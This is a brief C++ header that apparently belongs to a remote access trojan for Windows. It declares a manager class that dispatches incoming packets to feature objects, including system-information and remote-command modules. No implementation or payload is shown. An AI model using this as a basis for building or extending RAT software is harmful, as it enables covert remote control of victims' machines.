#ifndef OBJMGR_H
#define OBJMGR_H

#include <Windows.h>
#include <vector>
#include "bone_obj.h"
#include "connect.h"
/*
##################################################################
#    A list to manage features obj                               #
#    Default Objects:                                            #
#    0. Info obj:	Computer info, RAT info                      #
#    1. Cmd obj:	Remote Cmd                                   #
##################################################################
*/
class ObjMgr
{
public:
	bool	RegisterObj(BoneObj*);
	bool	OnPacketArrived(BYTE*, size_t);
	ObjMgr();
	~ObjMgr();
private:
	std::vector<BoneObj*> objList;
	Connection*	ConnObj;
};

#endif